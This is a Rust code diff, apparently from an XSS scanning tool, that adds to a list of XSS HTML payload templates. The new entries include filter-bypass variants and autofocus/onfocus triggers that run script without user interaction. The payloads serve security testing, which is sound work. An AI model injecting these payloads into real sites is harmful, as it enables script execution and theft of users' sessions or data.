@@ -13,17 +13,28 @@ pub fn useful_html_tag_names() -> &'static [&'static str] {
 
 pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     let templates = [
-        // CLASS
+        // CLASS markers (for DOM verification)
         "<IMG src=x onerror={JS} ClAss=dalfox>",
         "<sVg onload={JS} claSS=dalfox>",
         "<sCrIpt/cLaSs=dalfox>{JS}</scRipT>",
         "<xmp><p title=\"</xmp><svg/onload={JS}) class=dalfox>",
         "<details open ontoggle={JS} class=dalfox>",
         "<iFrAme/src=JaVAsCrIPt:{JS} ClAss=dalfox>",
-        // ID
+        // ID markers (for DOM verification)
         "<IMG src=x onerror={JS} id=dalfox>",
         "<sVg onload={JS} iD=dalfox>",
         "<sCrIpt/ID=dalfox>{JS}</scRipT>",
+        // Filter bypass: using / instead of space
+        "<svg/onload={JS}/class=dalfox>",
+        "<img/src=x/onerror={JS}/class=dalfox>",
+        // Filter bypass: autofocus+onfocus patterns (trigger without user interaction)
+        "<input autofocus onfocus={JS} class=dalfox>",
+        "<textarea autofocus onfocus={JS} class=dalfox></textarea>",
+        // Filter bypass: alternative event handlers
+        "<body onload={JS} class=dalfox>",
+        "<marquee onstart={JS} class=dalfox>",
+        "<video autoplay onloadstart={JS} class=dalfox><source></video>",
+        "<object onerror={JS} class=dalfox>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
